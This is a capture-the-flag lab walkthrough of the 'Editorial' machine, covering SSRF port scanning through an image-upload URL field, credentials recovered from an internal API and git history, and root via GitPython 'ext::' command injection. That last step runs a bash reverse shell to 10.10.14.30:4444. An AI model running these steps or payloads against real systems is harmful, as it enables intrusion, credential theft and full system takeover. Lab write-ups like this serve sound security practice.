## [Editorial]

### Lab Details 

- Difficulty: Easy
- Type: Web App, SSRF, Git, Priv Esc, Linux

#### Tasks
Q1: How many TCP ports are listening on Editorial?
- run nmap `nmap -sT -T4 -vv -A -p- -Pn -oA Editorial 10.10.11.20` 

Q2: What is the primary domain name used the webserver on editorial box?
- from the output of the nmap scan, we can see that the domain is editorial.htb
```
<snip>
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
<snip>
```

Q3: What relative endpoint on the webserver can cause the server to generate an outbound HTTP request?
- by running ffuf on the target domain `http://editorial.htb`, we found a page called upload
- on the upload page theres a function that allows image to be fetched from remote server
- we can test the function is vulnerable by opening a port and test for remote connection
- enter the attacker ip address and hit preview, we will receive a get from target
![[upload form.png]]
``` 
$: nc -lvnp 9005     
listening on [any] 9005 ...
connect to [10.10.14.30] from (UNKNOWN) [10.10.11.20] 33466
GET / HTTP/1.1
Host: 10.10.14.30:9005
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```
- request captured using burpsuite and we can see the post request is going to /upload-cover
![[test for SSRF.png]]

Q4: What TCP port is serving another webserver listening only on localhost?
- we can test the port using `ffuf` 
- download the post request in burpsuite (right click and copy to file)
- generate list of ports file which contains port number from 1 to 65536
- enumerate the ports from 1 to 65536
```
$: seq 1 65536 > test_ports.txt      

$ ffuf -u http://editorial.htb/upload-cover -request test_port_post_request -w test_ports.txt  -ac 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://editorial.htb/upload-cover
 :: Wordlist         : FUZZ: /home/kali/projects/WriteUps/Easy/Unix/Editorial/test_ports.txt
 :: Header           : Host: editorial.htb
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Connection: keep-alive
 :: Header           : Referer: http://editorial.htb/upload
 :: Header           : Accept-Language: en-US,en;q=0.9
 :: Header           : Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycoBeBhaHFCdglYsQ
 :: Header           : Accept: */*
 :: Header           : Origin: http://editorial.htb
 :: Data             : ------WebKitFormBoundarycoBeBhaHFCdglYsQ
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:FUZZ
------WebKitFormBoundarycoBeBhaHFCdglYsQ
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundarycoBeBhaHFCdglYsQ--
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

5000                    [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 327ms]
:: Progress: [65536/65536] :: Job [1/1] :: 123 req/sec :: Duration: [0:09:01] :: Errors: 1 ::
```
- Query http://127.0.0.1:5000 and capture the request we can see that we get a valid response from the target
![[test for SSRF.png]]

Q5: Which relative API endpoint returns a template that includes a default username and password?
- Query http:://127.0.0.1:5000 on form and click preview and right click the image and inspect we will get the response from server
![[get response on port 5000.png]]

```
$ cat 3e248a0c-0432-406d-b6ab-bd04e690c5e6 
{"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library.","endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.","endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.","endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.","endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.","endpoint":"/api/latest/metadata/changelog","methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.","endpoint":"/api/latest/metadata","methods":"GET"}}]}
```
- the file contains data in json and `/api/latest/metadata/mnessages/authors` looks interesting 
- we can use the same method to get server response for the authors endpoint
![[authors.png]]
- right click and inspect image to download, file contains login for user dev
```
$ cat 91372fbe-2549-4f2f-8657-1a8e74f77fd0 
{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}
```

Q6: Submit the flag located in the dev user's home directory.
- `ssh` into target with dev credentials
```
$ ssh dev@10.10.11.20 
dev@10.10.11.20's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)
<snip>
dev@editorial:~$ 
dev@editorial:~$ ls
apps  user.txt
```

Q7: What is the full path to the directory that contains a git repo but all the files have been deleted?

```
dev@editorial:~$ ls -la apps
total 12
drwxrwxr-x 3 dev dev 4096 Jun  5  2024 .
drwxr-x--- 4 dev dev 4096 Jun  5  2024 ..
drwxr-xr-x 8 dev dev 4096 Jun  5  2024 .git
```

Q8: What is the prod user's password on Editorial?
- based on this guide https://medium.com/stolabs/git-exposed-how-to-identify-and-exploit-62df3c165c37, we can use `git status` to see if we can retrieve any deleted files
```
$: git status
dev@editorial:~/apps$ git status
On branch master
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        deleted:    app_api/app.py
        deleted:    app_editorial/app.py
<snip>
```
- we can use `git restore .` to restore deleted files 
```
dev@editorial:~/apps$ git restore .
dev@editorial:~/apps$ ls
app_api  app_editorial
```
- after some digging i was not able to find any credentials amongs the app files
- move to inspect the log files 
```
dev@editorial:~/apps$ git log
commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:04:21 2023 -0500

    fix: bugfix in api port endpoint

commit dfef9f20e57d730b7d71967582035925d57ad883
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:01:11 2023 -0500

    change: remove debug and update api port

commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500

    feat: create api to editorial info
    
    * It (will) contains internal info about the editorial, this enable
       faster access to information.

commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:48:43 2023 -0500

    feat: create editorial app
    
    * This contains the base of this project.
    * Also we add a feature to enable to external authors send us their
       books and validate a future post in our editorial.
       
dev@editorial:~/apps$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

diff --git a/app_api/app.py b/app_api/app.py
index 61b786f..3373b14 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass
 
 # -------------------------------

```
- prods login can be found in one of the logs

Q9: What is the name of the Python script that the prod user can run as root after entering their password?
- check by running `sudo -l`
```
prod@editorial:~$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

Q10: What is name of the Python library used by clone_prod_changes.py to interact with Git repos?
- by inspecting the python script, its importing git
- searching online its part of GitPython library
```
prod@editorial:~$ cat /opt/internal_apps/clone_changes/clone_prod_change.py 
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]
```


Q11: What is name of the Python library used by clone_prod_changes.py to interact with Git repos?
- check using `pip` 
```
prod@editorial:~$ pip show GitPython
Name: GitPython
Version: 3.1.29
Summary: GitPython is a python library used to interact with Git repositories
Home-page: https://github.com/gitpython-developers/GitPython
Author: Sebastian Thiel, Michael Trier
Author-email: byronimo@gmail.com, mtrier@gmail.com
License: BSD
Location: /usr/local/lib/python3.10/dist-packages
Requires: gitdb
Required-by: 
```

Q12: What is the 2022 CVE ID for a command execution vulnerability in this version of GitPython?
- search online, we found https://github.com/gitpython-developers/GitPython/issues/1515
- according to https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858
- 
Q13: Submit the flag located in the root user's home directory.
- according to https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858
	- Affected versions of this package are vulnerable to Remote Code Execution (RCE) due to improper user input validation, which makes it possible to inject a maliciously crafted remote URL into the clone command. 
- from the POC we can see that we are able to execute a bash file
- create a reverse shell in bash and run it with python script
```
prod@editorial:~$ echo "bash -i >& /dev/tcp/10.10.14.30/4444 0>&1" > /tmp/shell.sh

prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% /tmp/shell.sh'

### attacker side
$: nc -lvnp 4444
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.30] from (UNKNOWN) [10.10.11.20] 47140
root@editorial:/opt/internal_apps/clone_changes# pwd
pwd
/opt/internal_apps/clone_changes
```
#### Resources
- Enumerate and exploit git: https://medium.com/stolabs/git-exposed-how-to-identify-and-exploit-62df3c165c37
- CVE for GitPython
#### Lesson Learned
- SSRF practice
